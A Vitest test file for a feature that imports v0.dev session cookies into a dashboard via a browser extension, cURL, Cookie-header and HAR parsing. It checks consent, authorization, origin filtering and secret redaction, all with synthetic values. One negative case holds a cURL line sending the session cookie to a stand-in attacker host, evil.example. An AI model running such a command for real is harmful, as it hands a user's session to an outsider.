import fs from "node:fs";
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest } from "next/server";
import { createBetterSqliteAdapter } from "../../src/lib/db/adapters/betterSqliteAdapter.js";
import { MIGRATIONS } from "../../src/lib/db/migrations/index.js";
import { applyVersionedMigrations } from "../../src/lib/db/migrate.js";

const state = await vi.hoisted(async () => {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const previous = process.env.DATA_DIR;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "v0-cookie-2034-"));
  process.env.DATA_DIR = dir;
  return { dir, previous, adapter: vi.fn(), adapterSync: vi.fn(), access: vi.fn(), operator: vi.fn(), origin: vi.fn(), fetch: vi.fn() };
});
vi.mock("@/lib/db/driver.js", () => ({ getAdapter: state.adapter, getAdapterSync: state.adapterSync }));
vi.mock("@/dashboardGuard", () => ({ canAccessManagementApi: state.access, isOperatorRequest: state.operator, hasExactRequestOrigin: state.origin }));
vi.mock("@/lib/localDb", async () => ({
  ...(await import("../../src/lib/db/repos/connectionsRepo.js")),
  getProviderNodeById: vi.fn(), getProviderNodes: vi.fn(), getProxyPoolById: vi.fn(),
}));
// Importing the real proxy module patches global fetch and bypasses this boundary stub.
vi.mock("../../open-sse/utils/proxyFetch.js", () => ({ proxyAwareFetch: state.fetch, evictResponseDispatcher: vi.fn() }));

import { POST as pair } from "../../src/app/api/providers/cookie-import/pairing/route.js";
import { POST as importCookies } from "../../src/app/api/providers/cookie-import/route.js";
import { clearPairings } from "../../src/lib/providers/cookieImport/pairing.js";
import { getCookieImportContract } from "../../src/lib/providers/cookieImport/contract.js";
import { getProviderConnectionById } from "../../src/lib/db/repos/connectionsRepo.js";
import { prepareCapture, runCapture, confirmationFor } from "../../extensions/provider-cookie-capture/capture.js";
import { parseCookieHeaderValue, parseCurlCommand, parseHarDocument, buildImportCandidates, candidatesAreAmbiguous } from "../../src/shared/utils/cookieImportParser.js";
import { V0VercelWebExecutor } from "../../open-sse/executors/v0-vercel-web.js";

const dashboard = "https://dashboard.example";
const provider = "v0-vercel-web";
const secret = "synthetic-v0-session";
let db;
let logs;
const request = (url, body, headers = {}) => new NextRequest(url, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify(body) });
async function issue(target) {
  const response = await pair(request(`${dashboard}/api/providers/cookie-import/pairing`, { provider, ...target }, { origin: dashboard, "x-9r-cli-token": "synthetic-operator" }));
  expect(response.status).toBe(201);
  return (await response.json()).pairing;
}
const submit = (pairing, body) => importCookies(request(pairing.importUrl, body, { [pairing.header]: pairing.token }));
const cookie = (value = secret) => ({ name: "__vercel_session", value, domain: "v0.dev", secure: true });
const body = (extra = {}) => ({ provider, origin: "https://v0.dev", cookies: [cookie()], ...extra });

beforeEach(() => {
  clearPairings();
  vi.stubEnv("BASE_URL", dashboard);
  vi.stubEnv("NEXT_PUBLIC_BASE_URL", "");
  db = createBetterSqliteAdapter(":memory:");
  db.exec("CREATE TABLE _meta (key TEXT PRIMARY KEY, value TEXT NOT NULL)");
  applyVersionedMigrations(db, MIGRATIONS);
  state.adapter.mockReset().mockResolvedValue(db);
  state.adapterSync.mockReset().mockReturnValue(db);
  state.access.mockReset().mockResolvedValue(true);
  state.operator.mockReset().mockResolvedValue(true);
  state.origin.mockReset().mockReturnValue(true);
  state.fetch.mockReset().mockResolvedValue(Response.json({ content: "synthetic reply" }));
  logs = ["log", "info", "warn", "error", "debug"].map((name) => vi.spyOn(console, name).mockImplementation(() => {}));
});
afterEach(() => { db.close(); vi.unstubAllEnvs(); vi.restoreAllMocks(); });
afterAll(() => {
  if (state.previous === undefined) delete process.env.DATA_DIR; else process.env.DATA_DIR = state.previous;
  fs.rmSync(state.dir, { recursive: true, force: true });
});

describe("v0 real cookie contract through import", () => {
  it("captures the selected tab store, imports it and dispatches only that stored account", async () => {
    const pairing = await issue({ action: "create", name: "Selected" });
    expect(pairing.contract).toEqual({ origin: "https://v0.dev", cookieNames: ["__vercel_session"], cookiePrefixes: [] });
    const chrome = {
      tabs: { query: vi.fn().mockResolvedValue([{ id: 4, url: "https://v0.dev/chat" }]), get: vi.fn().mockResolvedValue({ id: 4, url: "https://v0.dev/chat" }) },
      permissions: { contains: vi.fn().mockResolvedValue(true), request: vi.fn(), remove: vi.fn() },
      cookies: { getAllCookieStores: vi.fn().mockResolvedValue([{ id: "selected-store", tabIds: [4] }, { id: "other-store", tabIds: [5] }]), get: vi.fn().mockResolvedValue(cookie()) },
      scripting: { executeScript: vi.fn() },
    };
    const prepared = await prepareCapture({ chrome, text: JSON.stringify(pairing) });
    expect(prepared.ok).toBe(true);
    const fetchDashboard = vi.fn(async (url, init) => importCookies(new NextRequest(url, init)));
    expect((await runCapture({ chrome, fetch: fetchDashboard, plan: prepared.plan, confirmed: {} })).code).toBe("not_confirmed");
    expect(chrome.cookies.get).not.toHaveBeenCalled();
    const result = await runCapture({ chrome, fetch: fetchDashboard, plan: prepared.plan, confirmed: confirmationFor(prepared.plan) });
    expect(result.ok).toBe(true);
    expect(chrome.cookies.get).toHaveBeenCalledExactlyOnceWith({ url: "https://v0.dev/", name: "__vercel_session", storeId: "selected-store" });
    expect(chrome.scripting.executeScript).not.toHaveBeenCalled();
    expect(fetchDashboard).toHaveBeenCalledTimes(1);
    expect(JSON.stringify(result)).not.toContain(secret);
    expect(JSON.stringify(result)).not.toContain(pairing.token);
    const stored = await getProviderConnectionById(result.connection.id);
    expect(stored.apiKey).toBe(`__vercel_session=${secret}`);
    expect(db.all("SELECT * FROM providerConnections")[0].data).not.toContain(secret);
    const proxy = { connectionProxyEnabled: true, proxyPoolId: "synthetic-pool" };
    const execution = await new V0VercelWebExecutor().execute({ credentials: stored, proxyOptions: proxy, body: { model: "v0-default", messages: [{ role: "user", content: "hello" }] }, stream: false });
    expect(execution.response.status).toBe(200);
    expect(state.fetch).toHaveBeenCalledTimes(1);
    expect(state.fetch.mock.calls[0][0]).toBe("https://v0.dev/api/chat");
    expect(state.fetch.mock.calls[0][1].headers.Cookie).toBe(`__vercel_session=${secret}`);
    expect(state.fetch.mock.calls[0][2]).toEqual(proxy);
    expect(JSON.stringify(execution.headers)).not.toContain(secret);
    expect(JSON.stringify(logs.flatMap((spy) => spy.mock.calls))).not.toContain(secret);
  });

  it("requires management authority to issue a pairing and rejects an expired capture plan", async () => {
    state.access.mockResolvedValueOnce(false);
    const denied = await pair(request(`${dashboard}/api/providers/cookie-import/pairing`, { provider, action: "create", name: "Denied" }, { origin: dashboard }));
    expect(denied.status).toBe(403);
    const pairing = await issue({ action: "create", name: "Expired" });
    const chrome = { tabs: { query: vi.fn() } };
    const expired = await prepareCapture({ chrome, text: JSON.stringify(pairing), now: Date.parse(pairing.expiresAt) });
    expect(expired.code).toBe("pairing_expired");
    expect(chrome.tabs.query).not.toHaveBeenCalled();
  });

  it("selects real-contract Cookie, cURL and HAR candidates without accepting foreign origins or chunks", () => {
    const contract = getCookieImportContract(provider);
    expect(contract).toMatchObject({ origin: "https://v0.dev", cookieNames: ["__vercel_session"], cookiePrefixes: [] });
    const select = (kind, parsed) => buildImportCandidates({ kind, parsed }, contract);
    const header = select("header", parseCookieHeaderValue(`Cookie: tracking=x; __vercel_session=${secret}`));
    expect(header.candidates[0]).toMatchObject({ originKnown: false, cookies: [cookie()].map(({ name, value }) => ({ name, value })), dropped: ["tracking"] });
    const curl = select("curl", parseCurlCommand(`curl 'https://v0.dev/api/chat' -H 'Cookie: __vercel_session=${secret}'`));
    expect(curl.candidates[0].cookies).toEqual([{ name: "__vercel_session", value: secret }]);
    expect(select("curl", parseCurlCommand(`curl https://evil.example -b '__vercel_session=${secret}'`)).ok).toBe(false);
    const har = parseHarDocument(JSON.stringify({ log: { entries: ["https://evil.example/", "https://v0.dev/a", "https://v0.dev/b"].map((url, i) => ({ request: { url, cookies: [{ name: "__vercel_session", value: `synthetic-${i}` }] } })) } }));
    const candidates = select("har", har).candidates;
    expect(candidates).toHaveLength(2);
    expect(candidatesAreAmbiguous(candidates)).toBe(true);
    expect(select("header", parseCookieHeaderValue("__vercel_session.0=synthetic")).ok).toBe(false);
  });

  it("binds updates to their selected connection and refuses invalid origins and expired cookies", async () => {
    const first = await issue({ action: "create", name: "First" });
    const created = await submit(first, body());
    expect(created.status).toBe(201);
    const id = (await created.json()).connection.id;
    const second = await issue({ action: "create", name: "Second" });
    const other = await submit(second, body({ cookies: [cookie("synthetic-other")] }));
    const otherId = (await other.json()).connection.id;
    const wrong = await issue({ action: "update", connectionId: id });
    expect((await submit(wrong, body({ connectionId: otherId }))).status).toBe(409);
    const update = await issue({ action: "update", connectionId: id });
    const response = await submit(update, body({ connectionId: id, cookies: [cookie("synthetic-updated")] }));
    expect(response.status).toBe(200);
    expect(JSON.stringify(await response.json())).not.toContain("synthetic-updated");
    expect((await getProviderConnectionById(id)).apiKey).toBe("__vercel_session=synthetic-updated");
    expect((await getProviderConnectionById(otherId)).apiKey).toBe("__vercel_session=synthetic-other");
    for (const invalid of [body({ origin: "https://evil.example" }), body({ cookies: [{ ...cookie(), expirationDate: 1 }] }), body({ cookies: [{ ...cookie(), name: "__vercel_session.0" }] }), body({ localStorage: { unexpected: "synthetic-value" } })]) {
      const pairing = await issue({ action: "create", name: "Rejected" });
      expect((await submit(pairing, invalid)).status).toBe(400);
    }
    expect(db.all("SELECT * FROM providerConnections")).toHaveLength(2);
  });
});
